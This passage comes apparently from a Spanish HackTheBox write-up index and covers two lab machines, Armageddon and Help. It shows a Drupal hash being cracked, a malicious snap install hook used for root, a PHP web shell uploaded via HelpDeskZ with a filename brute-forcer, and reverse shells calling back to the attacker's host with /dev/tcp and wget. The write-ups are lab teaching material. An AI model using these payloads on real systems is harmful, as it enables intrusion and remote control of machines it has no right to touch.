seg√∫n los ejemplos de hashes de hashcat es de tipo Drupal7: Bien, entonces mediante hashcat o john podemos intentar crackear el hash, lo guardamos en un archivo y: ‚ù≠ cat hash_drupal_bruce $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97. oOsUf1xAhaadURt‚ù≠ john --wordlist=/usr/share/wordlists/rockyou. txt hash_drupal_bruce Using default input encoding: UTF-8Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])Cost 1 (iteration count) is 32768 for all loaded hashesPress 'q' or Ctrl-C to abort, almost any other key for statusbooboo      (?)1g 0:00:00:02 DONE (2021-03-31 25:25) 0. 4484g/s 104. 0p/s 104. 0c/s 104. 0C/s courtney. . harleyUse the  --show  option to display all of the cracked passwords reliablySession completedbooboo, jmmm intentemos ahora con esa contrase√±a ante SSH: Listos, tamos dentro‚Ä¶ ‚Ä¶ Escalada de privilegios #: Enumerando los permisos que tenemos, vemos algo interesante: [brucetherealadmin@armageddon shm]$ sudo -lMatching Defaults entries for brucetherealadmin on armageddon:  !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep= COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR  LS_COLORS , env_keep+= MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE , env_keep+= LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT  LC_MESSAGES , env_keep+= LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE , env_keep+= LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET  XAUTHORITY , secure_path=/sbin\:/bin\:/usr/sbin\:/usr/binUser brucetherealadmin may run the following commands on armageddon:  (root) NOPASSWD: /usr/bin/snap install *Podemos ejecutar el binario /usr/bin/snap para instalar todo lo que tengamos en la ruta actual (*). Esto con permisos de administrador, o sea que cuando ejecutemos el proceso anterior, se estar√° ejecutando (si agregamos sudo al inicio) como root.  snap podemos imaginarlo como Docker y las imagenes, donde ellas funcionan como un conjunto de de dependencias que conforman una aplicaci√≥n. Esto mismo pasa con los paquetes . snap, nos permiten ¬´empaquetar¬ª una aplicaci√≥n en un archivo (paquete realmente, solo que ya la repeti mucho :P).  Snap para instalar software en Linux.  https://es. wikipedia. org/wiki/Snap_(gestor_de_paquetes). Bien, haciendo una b√∫squeda r√°pida sobre vulnerabilidades relacionadas nos encontramos una antigua, tiene su CVE e incluso exploits en GitHub:  cve. mitre. org - CVE-2019-7304.  https://github. com/initstring/dirty_sock. El problema b√°sicamente viene de la API que implementa snapd en sus versiones menores a 2. 37. 1, esto permitiendo conseguir ejecuci√≥n de comandos en el sistema para obtener privesc‚Ä¶ Pero validando nuestra versi√≥n de snap (snap --version) vemos que es mayor a la vulnerable e incluso prob√°ndolo (por los loles) el exploit nos indica que el sistema no es vulnerable. Les dejo el post que tiene una explicaci√≥n excepcional de la vulnerabilidad por si le quieren echar un ojo:  Writeup - Linux Privilege Escalation via snapd (dirty_sock exploit). ¬øPero entonces para qu√© hacemos menci√≥n de esto? Bueno, si recordamos tenemos permisos de instalar paquetes . snap mediante snap (se repite, pero es necesario :P), el exploit en su estructura usa un paquete para la explotaci√≥n, ya que al momento de estar instalando el . snap, se est√°n ejecutando los comandos del atacante. En el mismo post hay un paso a paso para crear un paquete con el contenido malicioso, veamos: 1. Instalamos la herramienta que nos permite generar los paquetes. sudo apt install snapcraft -yosudo snap install snapcraft --classic2. Creamos directorios de trabajo, esto para ser organizados :P cd /tmpmkdir dirtycd dirty3. Le indicamos que nos inicie el directorio actual como un proyecto snap. snapcraft init4. Preparamos el sitio donde guardaremos lo que ser√° invocado cuando se est√© instalando el paquete, tambi√©n llamados hooks. mkdir snap/hookstouch snap/hooks/installchmod a+x snap/hooks/install Additionally, snaps have something called ‚Äúhooks‚Äù. One such hook, the ‚Äúinstall hook‚Äù is run at the time of snap installation and can be a simple shell script.    https://initblog. com/2019/dirty-sock/.  O sea que cuando estemos instalando el paquete, invocara el hook (: 5. Escribimos nuestro payload, el  EOF  simplemente le indica a cat cuando terminar de escribir el archivo install. Este y el paso 6 se pueden hacer simplemente abriendo el archivo con nano, vim, vi, etc. Pues por si algo. Inicialmente probar√© a guardar el output del id del usuario que ejecuta la instalaci√≥n, que si todo va bien deber√≠a ser root (: Esto como prueba inicial‚Ä¶ cat &gt; snap/hooks/install &lt;&lt;  EOF #!/bin/bashid &gt; /dev/shm/. id. txtEOF6. Configuramos el archivo snapcraft. yaml, la estructura de nuestro paquete. cat &gt; snap/snapcraft. yaml &lt;&lt;  EOF name: dirty-sockversion: '0. 1' summary: Como esssssssssssssssssdescription: |  Como seriaaaaaaaaaaaaa, como nos toqueeeeeeeeeee!grade: develconfinement: devmodeparts: my-part:  plugin: nilEOF7. Construimos finalmente el paquete. snapcraftAhora que sabemos los pasos, procedamos a ejecutarlos‚Ä¶ Ejecutando el √∫ltimo paso nos da un error: ‚ù≠ snapcraftThis snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features. This project is best built on 'Ubuntu 16. 04', but is building on a 'Parrot GNU/Linux 4. 9' host. Read more about bases at https://docs. snapcraft. io/t/base-snaps/11198Sorry, an error occurred in Snapcraft:Native builds aren't supported on Parrot GNU/Linux. You can however use 'snapcraft cleanbuild' with a container. Si nos fijamos en el output (y recordamos en nuestro research sobre como crear paquetes en Linux) se habla de que va mucho mejor en Ubuntu y que en Parrot OS no tenemos las opciones nativas‚Ä¶ Ac√° intent√© jugar con las ‚Äúsoluciones‚Äù que nos daba el propio output y tambi√©n con estas maneras de build ofrecidas por una gu√≠a](https://ubuntu. com/tutorials/create-your-first-snap#3-building-a-snap-is-easy), pero nada, no consegu√≠ construir el paquete.  Building a snap is easy. As√≠ que decid√≠ probar a generarlo con una VM Ubuntu a ver si era problema m√≠o o si est√° hecho exclusivamente para Ubuntu (aunque pueda que no sea ninguna de las dos opciones :P)‚Ä¶ Haciendo el mismo proceso y llegando al √∫ltimo paso nos responde: Perfecto, se nos genera el archivo, lo pasamos a nuestra m√°quina de atacante, lo subimos a la m√°quina v√≠ctima e instalamos: Nos ponemos es escucha mediante un servidor en Python: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y ahora lo descargamos: [brucetherealadmin@armageddon shm]$ curl http://10. 10. 14. 164:8000/dirty-sock_0. 1_amd64. snap -o dirty-sock_0. 1_amd64. snap[brucetherealadmin@armageddon shm]$ lsdirty-sock_0. 1_amd64. snap[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install *error: cannot find signatures with metadata for snap  dirty-sock_0. 1_amd64. snap # Le agregamos el parametro  --devmode  para que lo tome como  prueba [brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install * --devmodedirty-sock 0. 1 installedInstalado, asi que validemos si se gener√≥ el archivo . id. txt: [brucetherealadmin@armageddon shm]$ ls -latotal 8drwxrwxrwt.  2 root       root        80 abr 6 16:27 . drwxr-xr-x. 19 root       root       3100 abr 6 16:23 . . -rw-rw-r--.  1 brucetherealadmin brucetherealadmin 4096 abr 6 16:26 dirty-sock_0. 1_amd64. snap-rw-r--r--.  1 root       root        89 abr 6 16:27 . id. txt[brucetherealadmin@armageddon shm]$ cat . id. txt uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0[brucetherealadmin@armageddon shm]$Perfectooooooooooooooooooooooo, tenemos ejecuci√≥n de comandos en el sistema como el usuario root‚Ä¶ Ahora intentemos generar una reverse Shell y si no nos funciona tambi√©n podemos intentar modificar los permisos del binario /bin/bash y agregarle que ahora sea SUID, para que nos d√© una bash con respecto al usuario propietario sin problemas (o sea root)‚Ä¶ Veamos: Modificamos el archivo install: ‚ù≠ cat snap/hooks/install#!/bin/bashshred -zun 11 /dev/shm/. id. txt¬∑chmod 4755 /bin/bash¬∑bash -c  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 164/4433 0&gt;&amp;1 Generamos el paquete: Y ahora lo subimos a la m√°quina. Nos ponemos en escucha (nc -lvp 4433) e instalamos: (Arriba se explot√≥ o bueno, se queda abierto mientras tenemos la Shell ejecutando) Ya somos root en el sistema, o sea podemos hacer lo que queramos :P Peeeero tambi√©n se supone que asignamos el permiso SUID al binario /bin/bash, ech√©mosle un ojo y entendamos para qu√© lo hicimos.  (Parece que entra en conflicto con la reverse shell, asi que mejor creemos un paquete que simplemente haga esa tarea) ‚ù≠ cat snap/hooks/install#!/bin/bashchmod 4755 /bin/bash¬∑Y al instalarlo: [brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install * --devmodeerror: cannot perform the following tasks:- Run install hook of  dirty-sock  snap if present (run hook  install : chmod: changing permissions of '/bin/bash': Read-only file system)F, no nos deja‚Ä¶ Podr√≠amos intentar con /bin/sh, pero no nos dejar√≠a porque es un link hacia la bash: [brucetherealadmin@armageddon shm]$ ls -la /bin/shlrwxrwxrwx. 1 root root 4 dic 3 09:35 /bin/sh -&gt; bashPues nada, cambiando el permiso SUID del binario /bin/bash podr√≠amos haberle indicado con la instrucci√≥n /bin/bash -p que ejecute la bash con respecto al usuario propietario del objeto, o sea root, pero no lo logramos. De igual forma ya tenemos una Reverse Shell como root, as√≠ que pr√°cticamente tenemos todo (: Ahora solo nos quedar√≠a ver las flags (: ‚Ä¶ Hemo teminao‚Äô Me gusto que el inicio tir√≥ hacia la realidad (al ser un CVE), algunas malas configuraciones y finalmente el jugueteo con una vulnerabilidad conocida y real (CVE tambi√©n) pero pensando lateralmente‚Ä¶ Me gusto la m√°quina. Y bueno, como siempre y como nunca, a seguir rompiendo todo y nos leeremos en alg√∫n sitio de la vida (: Gracias por pasarte‚Ä¶ "
    }, {
    "id": 34,
    "url": "http://localhost:4000/htb/help",
    "title": "HackTheBox - Help",
    "body": "2021/07/22 - M√°quina Linux nivel f√°cil. Investigaremos subidas de archivos . php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotaci√≥n de un kernel con ganas de morir.  TL;DR (Spanish writeup): Creada por: cymtrick. A tope con vulnerabilidades conocidas‚Ä¶ Nos encontraremos una web por default ofrecida por Apache, profundizando en ella encontraremos un servicio llamado HelpDeskZ, volviendo a profundizar encontraremos una vulnerabilidad para explotar una subida de archivos (muy loca, pero interesant√≠sima), jugaremos con ella para subir un archivo . php y lograr ejecutar comandos en el sistema, finalmente conseguiremos ejecutar una reverse Shell como el usuario help. Estando en el sistema (no s√© si es necesario para la m√°quina, pero lo hicimos) encontramos unas credenciales por medio de MySQL, ser√°n v√°lidas para obtener una sesi√≥n SSH como help. Enumerando lo que tenemos a la mano, nos fijaremos cuidadosamente en la versi√≥n del kernel, si buscamos cositas relacionadas con ella llegaremos a un exploit, ¬øqu√© hace? Pues explotar el kernel üôÉ e. e Si la explotaci√≥n es exitosa nos devolver√≠a una Shell como el usuario root, jugaremos con ella para lograrlo. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Bastante R34LG4LIFE, lo cual ta buenisimooooooooooooooooo.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Buenas noches, siga, tome asiento por favor.  Enumeraci√≥n.      Enumeraci√≥n de puertos con nmap.    Enumeramos el servidor web (puerto 80).     Explotaci√≥n, exploramos el servicio de tickets HelpDeskZ.      Obtenemos ejecucion remota de comandos con un archivo . php como adjunto en un ticket.        ‚Äî Leemos el c√≥digo de la web para entender por qu√© podemos subir archivos . php aunque la web mostrara que no era un formato v√°lido.     Conseguimos credenciales para obtener una Shell con SSH.      Empezamos a dumpear la base de datos support.    Seguimos dumpeando y encontramos credenciales.     Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Enumeraci√≥n de puertos con nmap üîó: Empezaremos enumerando que puertos est√°n abiertos en la m√°quina, esto lo haremos con la ayuda de nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 121 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Nos responde con: ‚ù± cat initScan# Nmap 7. 80 scan initiated Wed Jul 21 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 121# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 121 ()	Status: UpHost: 10. 10. 10. 121 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3000/open/tcp//ppp///# Nmap done at Wed Jul 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 90. 73 seconds      Puerto   Descripci√≥n         22   SSH: Tenemos la posibilidad de obtener una Shell de manera segura.        80   HTTP: Nos ofrece un servidor web.        3000   No sabemos que ser√° PPP, veamos si con el siguiente escaneo logramos profundizar.    Ahora que tenemos los puertos activos que maneja la m√°quina haremos otro escaneo, esta vez para ver que versiones y scripts relacionan a cada servicio encontrado: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 121  [*] Open ports: 22,80,3000[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80,3000 -sC -sV 10. 10. 10. 121 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y obtenemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Wed Jul 21 25:25:25 2021 as: nmap -p 22,80,3000 -sC -sV -oN portScan 10. 10. 10. 121Nmap scan report for 10. 10. 10. 121Host is up (0. 11s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 6 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)|  256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)|_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)80/tcp  open http  Apache httpd 2. 4. 18 ((Ubuntu))|_http-server-header: Apache/2. 4. 18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works3000/tcp open http  Node. js Express framework|_http-title: Site doesn't have a title (application/json; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Jul 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 25. 82 secondsTenemos algunas cositas relevantes:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 6       80   HTTP   Apache httpd 2. 4. 18       3000   HTTP   Node. js Express   Bien, nada llamativo, pero sabemos que el puerto 3000 sostiene un servidor con node, tamos bien‚Ä¶ Por ahora nada m√°s, profundicemos a keeeeeeee! ‚Ä¶ Puerto 80 üîó: Si nos fijamos en nuestro escaneo de versiones, vemos que el puerto 80 sostiene la p√°gina por default ofrecida por Apache: Claramente nada interesante, jugando en internet con la versi√≥n de Apache tampoco vemos nada, intentemos ver si existen directorios fuera de nuestra vista: ‚ù± wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common. txt http://10. 10. 10. 121/FUZZ. . . =====================================================================ID      Response  Lines  Word    Chars    Payload=====================================================================000000024:  403    11 L   32 W    296 Ch    . htaccess 000000023:  403    11 L   32 W    291 Ch    . hta 000000025:  403    11 L   32 W    296 Ch    . htpasswd 000002180:  200    375 L  968 W   11321 Ch   index. html 000002305:  301    9 L   28 W    317 Ch    javascript 000003694:  403    11 L   32 W    300 Ch    server-status 000004001:  301    9 L   28 W    314 Ch    support . . . Opa, encontramos 2 directorios llamativos, javascript y support, si exploramos javascript nos indica que no tenemos permisos para ver su contenido; peeeeeeero si intentamos con support caemos ac√°: üòØ Un servicio llamado HelpDeskZ que nos permite darle a nuestro sitio un apartado de soporte mediante tickets, interesante, sigamos viendo‚Ä¶ Hay un apartado /login, pero probando credenciales por default no logramos pasarlo, intentamos algunos payloads de inyecciones conocidas pero tampoco. Jugando con los dem√°s √≠tems vemos uno para enviar nuestro ticket: Tenemos un formulario para detallar el problema, vemos un campo en el que podemos agregar un archivo, generemos uno para probar si podemos subir objetos . php: ‚ù± cat holiwis. php&lt;?php system( id ); ?&gt;El archivo en caso de ser interpretado por alguna web nos deberia devolver el resultado del comando id, intentemos enviar el formulario pero ahora agregando el archivo: Le pasamos el captcha y damos clic en Submit. La web nos responde: As√≠ que al parecer no podemos subir archivos . php, podriamos intentar cambiar el contenido agregando GIF8; al inicio del objeto para que el sistema y la web interpreten que el contenido es un gif, pero realmente es codigo . php. Peero esto no nos funciona, si jugamos con la extension tampoco llegamos a ningun lado, as√≠ que sigamos enumerando la web‚Ä¶ Podemos ver que recursos esta sosteniendo /support con ayuda de nuevo de wfuzz: ‚ù± wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common. txt http://10. 10. 10. 121/support/FUZZ. . . =====================================================================ID      Response  Lines  Word    Chars    Payload   =====================================================================000000015:  200    17 L   42 W    378 Ch    . gitattributes 000000025:  403    11 L   32 W    304 Ch    . htpasswd 000000024:  403    11 L   32 W    304 Ch    . htaccess 000000023:  403    11 L   32 W    299 Ch    . hta 000001243:  301    9 L   28 W    326 Ch    controllers 000001316:  301    9 L   28 W    318 Ch    css 000001748:  200    3 L   23 W    1144 Ch    favicon. ico 000002153:  301    9 L   28 W    321 Ch    images 000002174:  301    9 L   28 W    323 Ch    includes 000002181:  200    96 L   236 W   4453 Ch    index. php 000002337:  301    9 L   28 W    317 Ch    js 000004296:  301    9 L   28 W    322 Ch    uploads 000004387:  301    9 L   28 W    320 Ch    views . . . Bueno, varias cositas, las interesantes o llamativas son:  . gitattributes uploads viewsEl √∫nico que nos da contenido es . gitattributes, pero nada relevante para seguirlo. Los dem√°s recursos nos env√≠an de vuelta a la p√°gina por default de Apache, o sea, hace un redirect‚Ä¶ Jugando con cada uno de ellos para ver si exist√≠an recursos dentro, encontramos que al parecer uploads guarda los tickets que subimos, ya sea tooodo el ticket o los adjuntos: ‚ù± wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common. txt http://10. 10. 10. 121/support/uploads/FUZZ. . . =====================================================================ID      Response  Lines  Word    Chars    Payload =====================================================================000000023:  403    11 L   32 W    307 Ch    . hta 000000025:  403    11 L   32 W    312 Ch    . htpasswd 000000024:  403    11 L   32 W    312 Ch    . htaccess 000000693:  301    9 L   28 W    331 Ch    articles 000002181:  302    0 L   0 W    0 Ch     index. php 000004137:  301    9 L   28 W    330 Ch    tickets . . . Pero si intentamos direccionarnos hacia tickets nos redirecciona a la pantalla por default :( y si seguimos intentando profundizar en su contenido no encontramos nada m√°s. Intentando subir archivos y despues buscarlos en la ruta /support/uploads/tickets no encontramos nada ): ‚Ä¶ Explotaci√≥n #: Buscando vulnerabilidades relacionadas con HelpDeskZ encontramos dos principalmente, pero solo uno que no necesita credenciales para funcionar:  HelpDeskZ 1. 0. 2 - Arbitrary File Upload. Viendo el c√≥digo y lo que hace (en el propio c√≥digo explica la explotaci√≥n) el creador nos explica algo interesante:  ‚ÄúThe software in the default configuration allows upload for . php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. ‚Äù‚ÄúSo by guessing the time the file was uploaded, we can get RCE‚Äù Pero leyendo atentamente recordamos que a nosotros no nos deja subir archivos . php, o sea que quiz√°s estamos en una versi√≥n m√°s adelante a la que explota este exploit‚Ä¶ Peeeeeeeeeeeeeeeeeeeeeeeeero este exploit me hizo dar una idea de como trabajan los administradores de HelpDeskZ y que quiz√°s nuestra versi√≥n:  Tambi√©n tome los nombres de los archivos y los ‚Äúofusque‚Äù en md5, pero que al final le agregue la extensi√≥n real del archivo. La cosa es que necesitar√≠amos poder subir un archivo . php o con contenido . php que sea interpretado. ‚Ä¶ No fue necesario empezar a profundizar porque el siguiente link que hab√≠a abierto nos iluminaba (muy en la cara, lo cual ta feo) con que hacer:  How to upload a shell in HelpdeskZ v1. 0. 2. En √©l hace exactamente lo mismo, cambia peque√±√≠simos detalles pero es igual. Lo √∫nico que cambia es que nos indica esto:  Submit New ticket and upload the shell: Ignore the file not allowed warning Oooooh, al parecer en su PoC le da igual que salga el mensaje que no puede subir X tipo de archivo y aun as√≠ la explota, esto nos da la mano para pensar que podemos intentar lo mismo. El art√≠culo nos brinda un c√≥digo para explotar la m√°quina: Entendiendo un poco que hace el exploit üîó: import hashlibimport timeimport sysimport requestsimport calendarhelpdeskzBaseUrl =  http://10. 10. 10. 121/support/uploads/tickets/  # change thisfileName =  reverse_shell. php  # Your reverse shellresponse = requests. head('http://10. 10. 10. 121') # Change thisserverTime=response. headers['Date'] # getting the server timetimeFormat= %a, %d %b %Y %H:%M:%S %Z currentTime = int(calendar. timegm(time. strptime(serverTime,timeFormat)))for x in range(0, 800):  plaintext = fileName + str(currentTime - x)  md5hash = hashlib. md5(plaintext. encode()). hexdigest()  url = helpdeskzBaseUrl+md5hash+'. php'  print(url)  response = requests. head(url)  if response. status_code == 200:   print( found! )   sys. exit(0)print( Sorry, I did not find anything )En el nos spoilea que exploto ESTA m√°quina (la m√°quina help, por si no se entiende :P), as√≠ que por un lado estamos felices porque encontramos algo, pero sabemos que ese algo nos va a funcionar si o si :l Hablemos de que hace este y el anterior exploit r√°pidamente:  Extrae la fecha en la que hacemos la ejecuci√≥n del programa (en la que hace la conexi√≥n con la web, pero como es tan r√°pido, pr√°cticamente es el momento en que ejecutamos el script).  La pasa a formato timegm: O sea, la fecha a timestamp value.  Y hace 800 peticiones (da igual el n√∫mero, pueden ser 10, esto siempre y cuando se suba el archivo y de una se ejecute el exploit) para:     Tomar la fecha actual de ejecucion e irle restando 1,2,3,4,. . . ,800. Concatena el nombre original del archivo a esa resta.    Encripta el valor de nombrearchivoTIMESTAMP en formato MD5.    Y al final le agrega la extensi√≥n . php   Si en alg√∫n momento de las 800 peticiones encuentra que en X periodo de tiempo se subi√≥ Y archivo, nos mostrara la URL asociada.    ‚Ä¶ Obtenemos RCE con un archivo . php üîó: Perfecto, pues cambi√©moslo para que quede con nuestra data: . . . fileName =  holiwis. php . . . Ahora, creamos de nuevo un ticket, adjuntamos el archivo holiwis. php, vemos que nos responda File is not allowed y ejecutamos el exploit para ver si encuentra el archivo: ‚ù± python3 tryRCE. py. . . http://10. 10. 10. 121/support/uploads/tickets/e536560d711ec6b799cdd6bff5df7ff1. phphttp://10. 10. 10. 121/support/uploads/tickets/7f809bc1c8849caf3158f4cfae9b4d84. phphttp://10. 10. 10. 121/support/uploads/tickets/b312527ca778b642e03ee24e44918aeb. phphttp://10. 10. 10. 121/support/uploads/tickets/d54ee70b5314543bb595b6690dfd9a91. phphttp://10. 10. 10. 121/support/uploads/tickets/21cdbb35831b91f5f551d79e0e5bad58. phpfound!OPAAA, pues visitemos ese link: EJEEEEEEEEEEEE, tenemos ejecuci√≥n remota de comandooooooooooooooooooooooos!! Ahora generemos un archivo que nos permita ejecutar cualquier comando que le pasemos por una variable GET: ‚ù± cat holiwis. php &lt;?php system($_GET['xmd']); ?&gt;Entonces, le pasaremos nuestro comando a trav√©s de la variable xmd y esta ser√° interpretada por la funci√≥n system, generemos el ticket y busquemos el archivo: ‚ù± python3 tryRCE. py http://10. 10. 10. 121/support/uploads/tickets/8ea50935d73ed6f424a8a79adfb34de0. phphttp://10. 10. 10. 121/support/uploads/tickets/240236ef9c7351d8334a14df56870917. phphttp://10. 10. 10. 121/support/uploads/tickets/ee130b3f3dc98c3e9a71682e0bece6cb. phphttp://10. 10. 10. 121/support/uploads/tickets/22d8b499c06c57f6728ead123c0fede8. phphttp://10. 10. 10. 121/support/uploads/tickets/a21b24a794cf5736c769a2f19e42e6f9. phphttp://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. phpfound!Validamos: ‚ù± curl http://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. php?xmd=hostnamehelp‚ù± curl  http://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. php?xmd=hostname;id  helpuid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)Perfectooo, ahora si tenemos control con respecto a que comando ejecutamos, generemos una reverse Shell: Intentando con bash -i &gt;&amp; . . . no logramos ejecutarlo directamente, tambi√©n vemos que cURL no existe como binario (which+curl), peeeero si existe wget:  Tendremos que agregar los + para que los tome como espacios si es que ejecutamos todo desde la bash. ‚ù± curl  http://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. php?xmd=which+wget  /usr/bin/wgetAs√≠ que podemos probar a subir un archivo al sistema con c√≥digo bash y posteriormente ejecutarlo: ‚ù± cat rere. sh #!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 14. 2/4433 0&gt;&amp;1Levantamos un servidor web con Python: ‚ù± python3 -m http. serverSubimos archivo . sh con wget al directorio /tmp: # wget http://10. 10. 14. 2:8000/rere. sh -O /tmp/rere. sh‚ù± curl  http://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. php?xmd=wget+http://10. 10. 14. 2:8000/rere. sh+-O+/tmp/rere. sh  Validamos que exista: # ls -la /tmp/rere. sh‚ù± curl  http://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. php?xmd=ls+-la+/tmp/rere. sh  -rw-r--r-- 1 help help 133 Jul 21 25:25 /tmp/rere. shAhora, nos ponemos en escucha por el puerto que pusimos en el archivo, en mi caso el 4433: ‚ù± nc -lvp 4433Y finalmente ejecutamos el script que subimos: # bash /tmp/rere. sh‚ù± curl  http://10. 10. 10. 121/support/uploads/tickets/1ce35b9e8b7b6d3fd36c2ab9c8a52156. php?xmd=bash+/tmp/rere. sh  Esperamos un momento yyyy en nuestro listeneeeeeeer: Listones, estamos dentro del sistema como el usuario help, hagamos tratamiento de la TTY as√≠ evitamos preocuparnos por si ejecutamos CTRL+C, logramos tener hist√≥rico y adem√°s conseguimos una linda Shell :P ‚Ä¶ Es muy inc√≥modo estar colocando + a cada espacio cada que queramos ejecutar algo en el sistema, adem√°s de tener que movernos al final de la cadena y ay no jajaj, aprovechemos la oportunidad y cre√©monos un script que:  Nos encuentre el archivo con ayuda del timestamp.  Y nos permita ejecutar comandos con comodidad.  Intente hacer la creacion del ticket, pero el jugar con ese catpcha fue un poco doloroso, la mayoria de intentos son fallidos y va cambiando otro valor, as√≠ que F Ac√° se los dejo (junto al archivo que deber√≠amos subir):  helpdeskFind_RCE. py ‚ù± python3 helpdeskFind_RCE. py [+] Encontrando archivo: http://10. 10. 10. 121/support/uploads/tickets/99500535e6ed7f2de07ad7b03c5791f7. php ‚úî[+] Ejecutando id en el sistema: ‚úîuid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)[+] A r0mp3r t0do!‚ù± python3 helpdeskFind_RCE. py -c 'uname -a'[+] Ejecutando uname -a en el sistema: ‚úîLinux help 4. 4. 0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux[+] A r0mp3r t0do!tamos! ‚Ä¶ Exploramos el porqu√© nos dej√≥ subir archivos . php üîó: Ya estando en la m√°quina intentemos buscar el c√≥digo fuente de la web y ver el porqu√© nos dej√≥ jugar con archivos . php aunque el mensaje fuera otro. Enumerando llegamos a los objetos que controlan las acciones del portal: help@help:/var/www/html/support/controllers$ ls -latotal 88drwxr-xr-x 5 root root 4096 Nov 28 2018 . drwxr-xr-x 11 root root 4096 Nov 27 2018 . . drwxr-xr-x 2 root root 4096 Jan 5 2016 admindrwxr-xr-x 2 root root 4096 Jan 5 2016 client-rw-r--r-- 1 root root 1192 Jan 5 2016 home_controller. php-rw-r--r-- 1 root root  14 Jan 5 2016 . htaccess-rw-r--r-- 1 root root  202 Jan 5 2016 index. php-rw-r--r-- 1 root root 6673 Jan 5 2016 knowledgebase_controller. php-rw-r--r-- 1 root root 2575 Jan 5 2016 login_controller. php-rw-r--r-- 1 root root 1714 Jan 5 2016 lost_password_controller. php-rw-r--r-- 1 root root 1586 Jan 5 2016 news_controller. phpdrwxr-xr-x 3 root root 4096 Nov 27 2018 staff-rw-r--r-- 1 root root  724 Jan 5 2016 staff_controller. php-rw-r--r-- 1 root root 13002 Jan 5 2016 submit_ticket_controller. php-rw-r--r-- 1 root root  422 Jan 5 2016 user_account_controller. php-rw-r--r-- 1 root root 8772 Nov 28 2018 view_tickets_controller. phpVemos submit_ticket_controller. php, si vamos recorri√©ndolo llegamos a esta parte: help@help:/var/www/html/support/controllers$ cat submit_ticket_controller. php. . . if(!isset($error_msg) &amp;&amp; $settings['ticket_attachment']==1){  $uploaddir = UPLOAD_DIR. 'tickets/';  if($_FILES['attachment']['error'] == 0){    $ext = pathinfo($_FILES['attachment']['name'], 